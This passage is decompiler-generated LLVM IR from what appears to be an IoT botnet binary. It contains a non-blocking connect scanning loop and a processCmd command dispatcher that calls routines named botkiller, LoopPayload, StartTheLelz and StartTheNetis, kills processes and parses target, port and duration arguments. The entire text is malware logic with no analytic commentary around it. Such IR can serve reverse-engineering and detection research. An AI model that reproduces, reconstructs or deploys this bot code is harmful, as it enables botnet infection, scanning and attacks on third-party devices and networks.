  %v1_114d8 = load i32, i32* @sp, align 4
  %v2_114d8 = sub i32 %v1_114d8, %v3_114d0
  %v1_114e8 = add i32 %v2_114d8, 15
  %v3_114ec = and i32 %v1_114e8, -8
  %v2_11510 = mul i32 %v3_11458, 5
  store i32 %v2_11510, i32* @r2, align 4
  %v2_11520 = inttoptr i32 %v3_114ec to i8*
  %v3_11520 = call i32 @__GI_memset(i8* %v2_11520, i32 0)
  %v1_11528 = call i32 @malloc(i32 1024)
  store i32 1024, i32* @r2, align 4
  %v2_11540 = inttoptr i32 %v1_11528 to i8*
  %v3_11540 = call i32 @__GI_memset(i8* %v2_11540, i32 0)
  %v2_11548 = call i32 @__GI_time(i32* null)
  store i32 %v2_11548, i32* %r2.global-to-local, align 4
  %v2_11554 = add i32 %v2_11548, %arg3
  %v2_11690 = ptrtoint i32* %stack_var_-208 to i32
  %v2_116e8 = ptrtoint i32* %stack_var_-24 to i32
  %v2_11754 = ptrtoint i32* %stack_var_-216 to i32
  %v2_11798 = ptrtoint i32* %stack_var_-224 to i32
  %v2_1179c = ptrtoint i32* %stack_var_-220 to i32
  %v2_11620 = ptrtoint i32* %stack_var_-80 to i32
  %v8_119a054 = icmp sgt i32 %v2_11454, 1
  %v2_116ec = add i32 %v2_116e8, -184
  br label %dec_label_pc_119a8

dec_label_pc_1156c:                               ; preds = %dec_label_pc_11998.preheader, %dec_label_pc_1198c
  %storemerge357 = phi i32 [ %v1_11990, %dec_label_pc_1198c ], [ 0, %dec_label_pc_11998.preheader ]
  store i32 %v3_114ec, i32* %r2.global-to-local, align 4
  %v3_11578 = mul i32 %storemerge357, 8
  %v2_1157c = add i32 %v3_11578, %v3_114ec
  %v2_11580 = or i32 %v2_1157c, 4
  %v1_11584 = inttoptr i32 %v2_11580 to i8*
  %v2_11584 = load i8, i8* %v1_11584, align 4
  %v6_11590 = icmp eq i8 %v2_11584, 0
  %v7_11590 = icmp eq i8 %v2_11584, 1
  br i1 %v7_11590, label %dec_label_pc_116a4.lr.ph, label %dec_label_pc_11598

dec_label_pc_11598:                               ; preds = %dec_label_pc_1156c
  %v7_1159c = icmp eq i8 %v2_11584, 2
  br i1 %v7_1159c, label %dec_label_pc_11878.lr.ph, label %dec_label_pc_115a4

dec_label_pc_115a4:                               ; preds = %dec_label_pc_11598
  br i1 %v6_11590, label %dec_label_pc_115b4, label %dec_label_pc_1198c

dec_label_pc_115b4:                               ; preds = %dec_label_pc_115a4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_115c4 = call i32 @socket(i32 2, i32 1, i32 0)
  %v5_115d0 = mul i32 %storemerge357, 8
  %v6_115d0 = add i32 %v5_115d0, %v3_114ec
  %v7_115d0 = inttoptr i32 %v6_115d0 to i32*
  store i32 %v3_115c4, i32* %v7_115d0, align 8
  store i32 %storemerge357, i32* %r2.global-to-local, align 4
  %v6_115dc = inttoptr i32 %v2_1157c to i32*
  %v7_115dc = load i32, i32* %v6_115dc, align 8
  store i32 %v7_115dc, i32* @r4, align 4
  store i32 %storemerge357, i32* %r2.global-to-local, align 4
  %v7_115e8 = load i32, i32* %v6_115dc, align 8
  store i32 %v7_115e8, i32* @r3, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_115f8 = call i32 @__libc_fcntl(i32 %v7_115e8, i32 3)
  %v1_11600 = or i32 %v2_115f8, 2048
  store i32 %v1_11600, i32* @r3, align 4
  %v0_11604 = load i32, i32* @r4, align 4
  store i32 %v1_11600, i32* %r2.global-to-local, align 4
  %v2_11610 = call i32 @__libc_fcntl(i32 %v0_11604, i32 4)
  store i32 %storemerge357, i32* %r2.global-to-local, align 4
  %v7_1161c = load i32, i32* %v6_115dc, align 8
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_11630 = call i32 @__libc_connect(i32 %v7_1161c, i32 %v2_11620, i32 16)
  %v3_11638 = icmp eq i32 %v3_11630, -1
  br i1 %v3_11638, label %dec_label_pc_11640, label %dec_label_pc_11654

dec_label_pc_11640:                               ; preds = %dec_label_pc_115b4
  %v0_11640 = call i32 @__GI___errno_location()
  %v1_11648 = inttoptr i32 %v0_11640 to i32*
  %v2_11648 = load i32, i32* %v1_11648, align 4
  %v7_1164c = icmp eq i32 %v2_11648, 115
  br i1 %v7_1164c, label %dec_label_pc_1166c, label %dec_label_pc_11654

dec_label_pc_11654:                               ; preds = %dec_label_pc_115b4, %dec_label_pc_11640
  store i32 %v3_114ec, i32* %r2.global-to-local, align 4
  %v7_1165c = load i32, i32* %v6_115dc, align 8
  %v1_11664 = call i32 @__GI_close(i32 %v7_1165c)
  br label %dec_label_pc_1198c

dec_label_pc_1166c:                               ; preds = %dec_label_pc_11640
  store i32 %v2_11580, i32* %r2.global-to-local, align 4
  store i8 1, i8* %v1_11584, align 4
  br label %dec_label_pc_1198c

dec_label_pc_116a4.lr.ph:                         ; preds = %dec_label_pc_1156c
  br label %dec_label_pc_116a4

dec_label_pc_116a4:                               ; preds = %dec_label_pc_116a4.lr.ph, %dec_label_pc_116a4
  %storemerge513 = phi i32 [ 0, %dec_label_pc_116a4.lr.ph ], [ %v1_116b8, %dec_label_pc_116a4 ]
  store i32 %v2_11690, i32* %r2.global-to-local, align 4
  %v5_116b0 = mul nuw nsw i32 %storemerge513, 4
  %v6_116b0 = add i32 %v5_116b0, %v2_11690
  %v7_116b0 = inttoptr i32 %v6_116b0 to i32*
  store i32 0, i32* %v7_116b0, align 4
  %v1_116b8 = add nuw nsw i32 %storemerge513, 1
  %tmp47 = icmp ult i32 %v1_116b8, 32
  br i1 %tmp47, label %dec_label_pc_116a4, label %dec_label_pc_116cc

dec_label_pc_116cc:                               ; preds = %dec_label_pc_116a4
  store i32 %storemerge357, i32* %r2.global-to-local, align 4
  %v6_116d4 = inttoptr i32 %v2_1157c to i32*
  %v7_116d4 = load i32, i32* %v6_116d4, align 8
  %v3_116d8 = udiv i32 %v7_116d4, 32
  store i32 -184, i32* %r2.global-to-local, align 4
  %v3_116e4 = mul nuw nsw i32 %v3_116d8, 4
  %v2_116f0 = add i32 %v2_116ec, %v3_116e4
  %v1_116f4 = inttoptr i32 %v2_116f0 to i32*
  %v2_116f4 = load i32, i32* %v1_116f4, align 4
  store i32 %storemerge357, i32* %r2.global-to-local, align 4
  %v7_11700 = load i32, i32* %v6_116d4, align 8
  %v1_11704 = urem i32 %v7_11700, 32
  %v6_1170c = shl i32 1, %v1_11704
  %v2_11710 = or i32 %v6_1170c, %v2_116f4
  store i32 %v2_11710, i32* %v1_116f4, align 4
  store i32 0, i32* %stack_var_-216, align 4
  store i32 %storemerge357, i32* %r2.global-to-local, align 4
  %v7_11748 = load i32, i32* %v6_116d4, align 8
  %v1_1174c = add i32 %v7_11748, 1
  store i32 %v1_1174c, i32* %r2.global-to-local, align 4
  %v1_11758 = load i32, i32* @sp, align 4
  %v2_11758 = inttoptr i32 %v1_11758 to i32*
  store i32 %v2_11754, i32* %v2_11758, align 4
  %v0_1175c = load i32, i32* %r2.global-to-local, align 4
  store i32 %v2_11690, i32* %r2.global-to-local, align 4
  %v4_1176c = load i32, i32* %stack_var_-216, align 4
  %v5_1176c = call i32 @__libc_select(i32 %v0_1175c, i32 0, i32 %v2_11690, i32 0, i32 %v4_1176c)
  %v7_1177c = icmp eq i32 %v5_1176c, 1
  br i1 %v7_1177c, label %dec_label_pc_11784, label %dec_label_pc_11820

dec_label_pc_11784:                               ; preds = %dec_label_pc_116cc
  store i32 4, i32* %stack_var_-220, align 4
  store i32 %storemerge357, i32* %r2.global-to-local, align 4
  %v7_11794 = load i32, i32* %v6_116d4, align 8
  store i32 %v7_11794, i32* %r2.global-to-local, align 4
  %v1_117a0 = load i32, i32* @sp, align 4
  %v2_117a0 = inttoptr i32 %v1_117a0 to i32*
  store i32 %v2_1179c, i32* %v2_117a0, align 4
  %v0_117a4 = load i32, i32* %r2.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v4_117b4 = load i32, i32* %stack_var_-220, align 4
  %v5_117b4 = call i32 @getsockopt(i32 %v0_117a4, i32 1, i32 4, i32 %v2_11798, i32 %v4_117b4)
  %v3_117b8 = load i32, i32* %stack_var_-224, align 4
  %v2_117bc = icmp eq i32 %v3_117b8, 0
  br i1 %v2_117bc, label %dec_label_pc_117fc, label %dec_label_pc_117c4

dec_label_pc_117c4:                               ; preds = %dec_label_pc_11784
  store i32 %storemerge357, i32* %r2.global-to-local, align 4
  %v7_117cc = load i32, i32* %v6_116d4, align 8
  %v1_117d4 = call i32 @__GI_close(i32 %v7_117cc)
  store i32 %v2_11580, i32* %r2.global-to-local, align 4
  store i8 0, i8* %v1_11584, align 4
  br label %dec_label_pc_1198c

dec_label_pc_117fc:                               ; preds = %dec_label_pc_11784
  store i32 %v2_11580, i32* %r2.global-to-local, align 4
  store i8 2, i8* %v1_11584, align 4
  br label %dec_label_pc_1198c

dec_label_pc_11820:                               ; preds = %dec_label_pc_116cc
  %v3_11824 = icmp eq i32 %v5_1176c, -1
  br i1 %v3_11824, label %dec_label_pc_1182c, label %dec_label_pc_1198c

dec_label_pc_1182c:                               ; preds = %dec_label_pc_11820
  store i32 %storemerge357, i32* %r2.global-to-local, align 4
  %v7_11834 = load i32, i32* %v6_116d4, align 8
  %v1_1183c = call i32 @__GI_close(i32 %v7_11834)
  store i32 %v2_11580, i32* %r2.global-to-local, align 4
  store i8 0, i8* %v1_11584, align 4
  br label %dec_label_pc_1198c

dec_label_pc_11878.lr.ph:                         ; preds = %dec_label_pc_11598
  br label %dec_label_pc_11878

dec_label_pc_11878:                               ; preds = %dec_label_pc_11878.lr.ph, %dec_label_pc_11878
  %storemerge49 = phi i32 [ 0, %dec_label_pc_11878.lr.ph ], [ %v1_1188c, %dec_label_pc_11878 ]
  store i32 %v2_11690, i32* %r2.global-to-local, align 4
  %v5_11884 = mul nuw nsw i32 %storemerge49, 4
  %v6_11884 = add i32 %v5_11884, %v2_11690
  %v7_11884 = inttoptr i32 %v6_11884 to i32*
  store i32 0, i32* %v7_11884, align 4
  %v1_1188c = add nuw nsw i32 %storemerge49, 1
  %tmp48 = icmp ult i32 %v1_1188c, 32
  br i1 %tmp48, label %dec_label_pc_11878, label %dec_label_pc_118a0

dec_label_pc_118a0:                               ; preds = %dec_label_pc_11878
  store i32 %storemerge357, i32* %r2.global-to-local, align 4
  %v6_118a8 = inttoptr i32 %v2_1157c to i32*
  %v7_118a8 = load i32, i32* %v6_118a8, align 8
  %v3_118ac = udiv i32 %v7_118a8, 32
  store i32 -184, i32* %r2.global-to-local, align 4
  %v3_118b8 = mul nuw nsw i32 %v3_118ac, 4
  %v2_118c4 = add i32 %v2_116ec, %v3_118b8
  %v1_118c8 = inttoptr i32 %v2_118c4 to i32*
  %v2_118c8 = load i32, i32* %v1_118c8, align 4
  store i32 %storemerge357, i32* %r2.global-to-local, align 4
  %v7_118d4 = load i32, i32* %v6_118a8, align 8
  %v1_118d8 = urem i32 %v7_118d4, 32
  %v6_118e0 = shl i32 1, %v1_118d8
  %v2_118e4 = or i32 %v6_118e0, %v2_118c8
  store i32 %v2_118e4, i32* %v1_118c8, align 4
  store i32 0, i32* %stack_var_-216, align 4
  store i32 %storemerge357, i32* %r2.global-to-local, align 4
  %v7_1191c = load i32, i32* %v6_118a8, align 8
  %v1_11920 = add i32 %v7_1191c, 1
  store i32 %v1_11920, i32* %r2.global-to-local, align 4
  %v1_1192c = load i32, i32* @sp, align 4
  %v2_1192c = inttoptr i32 %v1_1192c to i32*
  store i32 %v2_11754, i32* %v2_1192c, align 4
  %v0_11930 = load i32, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v4_11940 = load i32, i32* %stack_var_-216, align 4
  %v5_11940 = call i32 @__libc_select(i32 %v0_11930, i32 0, i32 0, i32 %v2_11690, i32 %v4_11940)
  %v2_11950 = icmp eq i32 %v5_11940, 0
  br i1 %v2_11950, label %dec_label_pc_1198c, label %dec_label_pc_11958

dec_label_pc_11958:                               ; preds = %dec_label_pc_118a0
  store i32 %storemerge357, i32* %r2.global-to-local, align 4
  %v7_11960 = load i32, i32* %v6_118a8, align 8
  %v1_11968 = call i32 @__GI_close(i32 %v7_11960)
  store i32 %v2_11580, i32* %r2.global-to-local, align 4
  store i8 0, i8* %v1_11584, align 4
  br label %dec_label_pc_1198c

dec_label_pc_1198c:                               ; preds = %dec_label_pc_115a4, %dec_label_pc_11820, %dec_label_pc_118a0, %dec_label_pc_1182c, %dec_label_pc_117fc, %dec_label_pc_117c4, %dec_label_pc_1166c, %dec_label_pc_11654, %dec_label_pc_11958
  %v1_11990 = add nuw nsw i32 %storemerge357, 1
  store i32 %v1_11990, i32* %r2.global-to-local, align 4
  %v5_119a4 = icmp slt i32 %v1_11990, %v3_11458
  br i1 %v5_119a4, label %dec_label_pc_1156c, label %dec_label_pc_119a8

dec_label_pc_119a8:                               ; preds = %dec_label_pc_11998.preheader, %dec_label_pc_1198c, %dec_label_pc_114a8
  %v2_119ac = call i32 @__GI_time(i32* null)
  store i32 %v2_119ac, i32* %r2.global-to-local, align 4
  %v5_119bc = icmp slt i32 %v2_119ac, %v2_11554
  br i1 %v5_119bc, label %dec_label_pc_11998.preheader, label %dec_label_pc_119c0

dec_label_pc_11998.preheader:                     ; preds = %dec_label_pc_119a8
  store i32 0, i32* %r2.global-to-local, align 4
  br i1 %v8_119a054, label %dec_label_pc_1156c, label %dec_label_pc_119a8

dec_label_pc_119c0:                               ; preds = %dec_label_pc_119a8, %entry
  %v1_119cc = phi i32 [ %v3_11494, %entry ], [ %v2_119ac, %dec_label_pc_119a8 ]
  ret i32 %v1_119cc

; uselistorder directives
  uselistorder i32 %v1_11990, { 2, 1, 0 }
  uselistorder i32 %storemerge49, { 1, 0 }
  uselistorder i32 %storemerge513, { 1, 0 }
  uselistorder i8* %v1_11584, { 1, 2, 4, 3, 0, 5 }
  uselistorder i32 %v2_11580, { 1, 2, 4, 3, 0, 5 }
  uselistorder i32 %v2_1157c, { 1, 0, 2, 3 }
  uselistorder i32 %storemerge357, { 1, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 14, 13, 12, 0, 15 }
  uselistorder i32 %v2_11690, { 2, 0, 3, 6, 5, 1, 4 }
  uselistorder i32 %v3_114ec, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v3_11458, { 1, 2, 0 }
  uselistorder i32 %v0_11448, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-80, { 1, 0 }
  uselistorder i32* %stack_var_-216, { 0, 2, 1, 3, 4 }
  uselistorder i32* %r2.global-to-local, { 42, 39, 38, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 40, 41, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @getsockopt, { 2, 1, 3, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__libc_select, { 7, 6, 5, 8, 4, 3, 2, 1, 0 }
  uselistorder i32 115, { 1, 2, 0, 3, 4 }
  uselistorder i32 -184, { 1, 2, 0 }
  uselistorder i32 (i32, i32*)* @getHost, { 0, 1, 4, 2, 3 }
  uselistorder i32 ()* @getdtablesize, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1198c, { 8, 2, 3, 1, 4, 5, 6, 7, 0 }
  uselistorder label %dec_label_pc_11878, { 1, 0 }
  uselistorder label %dec_label_pc_116a4, { 1, 0 }
  uselistorder label %dec_label_pc_11654, { 1, 0 }
}

define i32 @processCmd(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg2 to i32
  %stack_var_-4 = alloca i32, align 4
  %v3_119d4 = load i32, i32* @r4, align 4
  %v6_119d4 = load i32, i32* @r5, align 4
  %v9_119d4 = load i32, i32* @r6, align 4
  %v12_119d4 = load i32, i32* @r7, align 4
  %v15_119d4 = load i32, i32* @r8, align 4
  %v18_119d4 = load i32, i32* @fp, align 4
  store i32 72156, i32* %stack_var_-4, align 4
  %v2_119d8 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_119d8, i32* @fp, align 4
  %v2_119ec = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1fda4.52 to i32), i32* @r1, align 4
  %v3_119f8 = inttoptr i32 %v2_119ec to i8*
  %v4_119f8 = call i32 @__GI_strcoll(i8* %v3_119f8, i32 ptrtoint ([5 x i8]* @global_var_1fda4.52 to i32))
  %v2_11a00 = icmp eq i32 %v4_119f8, 0
  br i1 %v2_11a00, label %dec_label_pc_11a08, label %dec_label_pc_11a20

dec_label_pc_11a08:                               ; preds = %entry
  %v2_11a0c = load i32, i32* @global_var_2c5e8.50, align 4
  %v3_11a18 = call i32 @HackerPrint(i32 %v2_11a0c, i32 ptrtoint ([6 x i8]* @global_var_22808.764 to i32))
  br label %dec_label_pc_12d38

dec_label_pc_11a20:                               ; preds = %entry
  %v2_11a24 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([11 x i8]* @global_var_22810.766 to i32), i32* @r1, align 4
  %v3_11a30 = inttoptr i32 %v2_11a24 to i8*
  %v4_11a30 = call i32 @__GI_strcoll(i8* %v3_11a30, i32 ptrtoint ([11 x i8]* @global_var_22810.766 to i32))
  %v2_11a38 = icmp eq i32 %v4_11a30, 0
  br i1 %v2_11a38, label %dec_label_pc_11a40, label %dec_label_pc_11a6c

dec_label_pc_11a40:                               ; preds = %dec_label_pc_11a20
  %v2_11a44 = load i32, i32* @global_var_2c5e8.50, align 4
  store i32 %v2_11a44, i32* @r4, align 4
  %v2_11a4c = load i32, i32* @global_var_32844.478, align 4
  store i32 %v2_11a4c, i32* @r0, align 4
  %v1_11a50 = call i32 @__GI_inet_ntoa(i32 %v2_11a4c)
  %v0_11a58 = load i32, i32* @r4, align 4
  store i32 %v1_11a50, i32* @r2, align 4
  %v3_11a64 = call i32 @HackerPrint(i32 %v0_11a58, i32 ptrtoint ([10 x i8]* @global_var_2281c.769 to i32))
  br label %dec_label_pc_12d38

dec_label_pc_11a6c:                               ; preds = %dec_label_pc_11a20
  %v2_11a70 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_22828.771 to i32), i32* @r1, align 4
  %v3_11a7c = inttoptr i32 %v2_11a70 to i8*
  %v4_11a7c = call i32 @__GI_strcoll(i8* %v3_11a7c, i32 ptrtoint ([8 x i8]* @global_var_22828.771 to i32))
  store i32 %v4_11a7c, i32* @r0, align 4
  %v2_11a84 = icmp eq i32 %v4_11a7c, 0
  br i1 %v2_11a84, label %dec_label_pc_11a8c, label %dec_label_pc_11ac0

dec_label_pc_11a8c:                               ; preds = %dec_label_pc_11a6c
  %v0_11a8c = call i32 @listFork()
  %v2_11a94 = icmp eq i32 %v0_11a8c, 0
  br i1 %v2_11a94, label %dec_label_pc_11a9c, label %dec_label_pc_11ac0

dec_label_pc_11a9c:                               ; preds = %dec_label_pc_11a8c
  %v2_11aa0 = load i32, i32* @global_var_2c5e8.50, align 4
  %v3_11aac = call i32 @HackerPrint(i32 %v2_11aa0, i32 ptrtoint ([13 x i8]* @global_var_22830.773 to i32))
  %v1_11ab0 = call i32 @botkiller(i32 %v3_11aac)
  %v1_11ab4 = call i32 @RemoveTMP(i32 %v1_11ab0)
  %v1_11abc = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_11ac0

dec_label_pc_11ac0:                               ; preds = %dec_label_pc_11a8c, %dec_label_pc_11a6c, %dec_label_pc_11a9c
  %v2_11ac4 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_22840.775 to i32), i32* @r1, align 4
  %v3_11ad0 = inttoptr i32 %v2_11ac4 to i8*
  %v4_11ad0 = call i32 @__GI_strcoll(i8* %v3_11ad0, i32 ptrtoint ([7 x i8]* @global_var_22840.775 to i32))
  store i32 %v4_11ad0, i32* @r0, align 4
  %v2_11ad8 = icmp eq i32 %v4_11ad0, 0
  br i1 %v2_11ad8, label %dec_label_pc_11ae0, label %dec_label_pc_11b10

dec_label_pc_11ae0:                               ; preds = %dec_label_pc_11ac0
  %v0_11ae0 = call i32 @listFork()
  %v2_11ae8 = icmp eq i32 %v0_11ae0, 0
  br i1 %v2_11ae8, label %dec_label_pc_11af0, label %dec_label_pc_11b10

dec_label_pc_11af0:                               ; preds = %dec_label_pc_11ae0
  %v2_11af4 = load i32, i32* @global_var_2c5e8.50, align 4
  %v3_11b00 = call i32 @HackerPrint(i32 %v2_11af4, i32 ptrtoint ([16 x i8]* @global_var_22848.777 to i32))
  %v1_11b04 = call i32 @LoopPayload(i32 %v3_11b00)
  %v1_11b0c = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_11b10

dec_label_pc_11b10:                               ; preds = %dec_label_pc_11ae0, %dec_label_pc_11ac0, %dec_label_pc_11af0
  %v2_11b14 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_22858.779 to i32), i32* @r1, align 4
  %v3_11b20 = inttoptr i32 %v2_11b14 to i8*
  %v4_11b20 = call i32 @__GI_strcoll(i8* %v3_11b20, i32 ptrtoint ([7 x i8]* @global_var_22858.779 to i32))
  %v2_11b28 = icmp eq i32 %v4_11b20, 0
  br i1 %v2_11b28, label %dec_label_pc_11b30, label %dec_label_pc_11c30

dec_label_pc_11b30:                               ; preds = %dec_label_pc_11b10
  %v7_11b34 = icmp eq i32 %arg1, 2
  br i1 %v7_11b34, label %dec_label_pc_11b54, label %dec_label_pc_11b3c

dec_label_pc_11b3c:                               ; preds = %dec_label_pc_11b30
  %v2_11b40 = load i32, i32* @global_var_2c5e8.50, align 4
  %v3_11b4c = call i32 @HackerPrint(i32 %v2_11b40, i32 ptrtoint ([16 x i8]* @global_var_22860.781 to i32))
  br label %dec_label_pc_12d38

dec_label_pc_11b54:                               ; preds = %dec_label_pc_11b30
  %v1_11b58 = add i32 %tmp, 4
  %v1_11b5c = inttoptr i32 %v1_11b58 to i32*
  %v2_11b5c = load i32, i32* %v1_11b5c, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_22870.783 to i32), i32* @r1, align 4
  %v3_11b68 = inttoptr i32 %v2_11b5c to i8*
  %v4_11b68 = call i32 @__GI_strcoll(i8* %v3_11b68, i32 ptrtoint ([4 x i8]* @global_var_22870.783 to i32))
  %v2_11b70 = icmp eq i32 %v4_11b68, 0
  br i1 %v2_11b70, label %dec_label_pc_11b78, label %dec_label_pc_11bbc

dec_label_pc_11b78:                               ; preds = %dec_label_pc_11b54
  %v2_11b7c = load i32, i32* @global_var_3284c.785, align 4
  %v2_11b80 = icmp eq i32 %v2_11b7c, 0
  br i1 %v2_11b80, label %dec_label_pc_12d38, label %dec_label_pc_11b88

dec_label_pc_11b88:                               ; preds = %dec_label_pc_11b78
  %v2_11b98 = call i32 @kill(i32 %v2_11b7c, i32 9)
  %v2_11ba0 = load i32, i32* @global_var_2c5e8.50, align 4
  %v3_11bac = call i32 @HackerPrint(i32 %v2_11ba0, i32 ptrtoint ([5 x i8]* @global_var_22874.787 to i32))
  store i32 0, i32* @global_var_3284c.785, align 4
  br label %dec_label_pc_11bbc

dec_label_pc_11bbc:                               ; preds = %dec_label_pc_11b54, %dec_label_pc_11b88
  %v2_11bc4 = load i32, i32* %v1_11b5c, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_2287c.789 to i32), i32* @r1, align 4
  %v3_11bd0 = inttoptr i32 %v2_11bc4 to i8*
  %v4_11bd0 = call i32 @__GI_strcoll(i8* %v3_11bd0, i32 ptrtoint ([3 x i8]* @global_var_2287c.789 to i32))
  store i32 %v4_11bd0, i32* @r0, align 4
  %v2_11bd8 = icmp eq i32 %v4_11bd0, 0
  br i1 %v2_11bd8, label %dec_label_pc_11be0, label %dec_label_pc_11c30

dec_label_pc_11be0:                               ; preds = %dec_label_pc_11bbc
  %v2_11be4 = load i32, i32* @global_var_3284c.785, align 4
  %v2_11be8 = icmp eq i32 %v2_11be4, 0
  br i1 %v2_11be8, label %dec_label_pc_11bf0, label %dec_label_pc_12d38

dec_label_pc_11bf0:                               ; preds = %dec_label_pc_11be0
  %v0_11bf0 = call i32 @__libc_fork()
  %v2_11c00 = icmp eq i32 %v0_11bf0, 0
  br i1 %v2_11c00, label %dec_label_pc_11c24, label %dec_label_pc_11c08

dec_label_pc_11c08:                               ; preds = %dec_label_pc_11bf0
  store i32 %v0_11bf0, i32* @global_var_3284c.785, align 4
  br label %dec_label_pc_12d38

dec_label_pc_11c24:                               ; preds = %dec_label_pc_11bf0
  %v0_11c24 = call i32 @StartTheLelz()
  %v1_11c2c = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_11c30

dec_label_pc_11c30:                               ; preds = %dec_label_pc_11bbc, %dec_label_pc_11b10, %dec_label_pc_11c24
  %v2_11c34 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_22880.791 to i32), i32* @r1, align 4
  %v3_11c40 = inttoptr i32 %v2_11c34 to i8*
  %v4_11c40 = call i32 @__GI_strcoll(i8* %v3_11c40, i32 ptrtoint ([6 x i8]* @global_var_22880.791 to i32))
  %v2_11c48 = icmp eq i32 %v4_11c40, 0
  br i1 %v2_11c48, label %dec_label_pc_11c50, label %dec_label_pc_11ca0

dec_label_pc_11c50:                               ; preds = %dec_label_pc_11c30
  %v7_11c54 = icmp eq i32 %arg1, 2
  br i1 %v7_11c54, label %dec_label_pc_11c5c, label %dec_label_pc_12d38

dec_label_pc_11c5c:                               ; preds = %dec_label_pc_11c50
  %v1_11c60 = add i32 %tmp, 4
  %v1_11c64 = inttoptr i32 %v1_11c60 to i32*
  %v2_11c64 = load i32, i32* %v1_11c64, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_2287c.789 to i32), i32* @r1, align 4
  %v3_11c70 = inttoptr i32 %v2_11c64 to i8*
  %v4_11c70 = call i32 @__GI_strcoll(i8* %v3_11c70, i32 ptrtoint ([3 x i8]* @global_var_2287c.789 to i32))
  %v2_11c78 = icmp eq i32 %v4_11c70, 0
  br i1 %v2_11c78, label %dec_label_pc_11c80, label %dec_label_pc_11ca0

dec_label_pc_11c80:                               ; preds = %dec_label_pc_11c5c
  %v2_11c84 = load i32, i32* @global_var_2c5e8.50, align 4
  %v3_11c90 = call i32 @HackerPrint(i32 %v2_11c84, i32 ptrtoint ([25 x i8]* @global_var_22888.793 to i32))
  %v1_11c94 = call i32 @StartTheNetis(i32 %v3_11c90)
  %v1_11c9c = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_11ca0

dec_label_pc_11ca0:                               ; preds = %dec_label_pc_11c5c, %dec_label_pc_11c30, %dec_label_pc_11c80
  %v2_11ca4 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_228a4.795 to i32), i32* @r1, align 4
  %v3_11cb0 = inttoptr i32 %v2_11ca4 to i8*
  %v4_11cb0 = call i32 @__GI_strcoll(i8* %v3_11cb0, i32 ptrtoint ([5 x i8]* @global_var_228a4.795 to i32))
  %v2_11cb8 = icmp eq i32 %v4_11cb0, 0
  br i1 %v2_11cb8, label %dec_label_pc_11cc0, label %dec_label_pc_11e04

dec_label_pc_11cc0:                               ; preds = %dec_label_pc_11ca0
  %v7_11cc8 = icmp slt i32 %arg1, 4
  br i1 %v7_11cc8, label %dec_label_pc_12d38, label %dec_label_pc_11ccc

dec_label_pc_11ccc:                               ; preds = %dec_label_pc_11cc0
  %v1_11cd0 = add i32 %tmp, 8
  %v1_11cd4 = inttoptr i32 %v1_11cd0 to i32*
  %v2_11cd4 = load i32, i32* %v1_11cd4, align 4
  store i32 %v2_11cd4, i32* @r0, align 4
  %v1_11cdc = call i32 @atol(i32 %v2_11cd4)
  %tmp114 = icmp slt i32 %v1_11cdc, 1
  br i1 %tmp114, label %dec_label_pc_12d38, label %dec_label_pc_11cec

dec_label_pc_11cec:                               ; preds = %dec_label_pc_11ccc
  %v1_11cf0 = add i32 %tmp, 12
  %v1_11cf4 = inttoptr i32 %v1_11cf0 to i32*
  %v2_11cf4 = load i32, i32* %v1_11cf4, align 4
  store i32 %v2_11cf4, i32* @r0, align 4
  %v1_11cfc = call i32 @atol(i32 %v2_11cf4)
  %v5_11d08 = icmp sgt i32 %v1_11cfc, 0
  br i1 %v5_11d08, label %dec_label_pc_11d10, label %dec_label_pc_12d38

dec_label_pc_11d10:                               ; preds = %dec_label_pc_11cec
  %v1_11d14 = add i32 %tmp, 4
  %v1_11d18 = inttoptr i32 %v1_11d14 to i32*
  %v2_11d18 = load i32, i32* %v1_11d18, align 4
  %v2_11d28 = load i32, i32* %v1_11cd4, align 4
  store i32 %v2_11d28, i32* @r0, align 4
  %v1_11d30 = call i32 @atol(i32 %v2_11d28)
  %v2_11d44 = load i32, i32* %v1_11cf4, align 4
  store i32 %v2_11d44, i32* @r0, align 4
  %v1_11d4c = call i32 @atol(i32 %v2_11d44)
  store i32 %v2_11d18, i32* @r0, align 4
  %v2_11d64 = call i32 @__GI_strchr(i32 %v2_11d18, i32 44)
  store i32 %v2_11d64, i32* @r0, align 4
  %v2_11d6c = icmp eq i32 %v2_11d64, 0
  br i1 %v2_11d6c, label %dec_label_pc_11ddc, label %dec_label_pc_11d74

dec_label_pc_11d74:                               ; preds = %dec_label_pc_11d10
  %v2_11d80 = call i32 @__GI_strtok(i32 %v2_11d18, i32 ptrtoint (i32* @global_var_227dc.748 to i32))
  store i32 %v2_11d80, i32* @r0, align 4
  %v2_11dd050 = icmp eq i32 %v2_11d80, 0
  br i1 %v2_11dd050, label %dec_label_pc_11e04, label %dec_label_pc_11d90

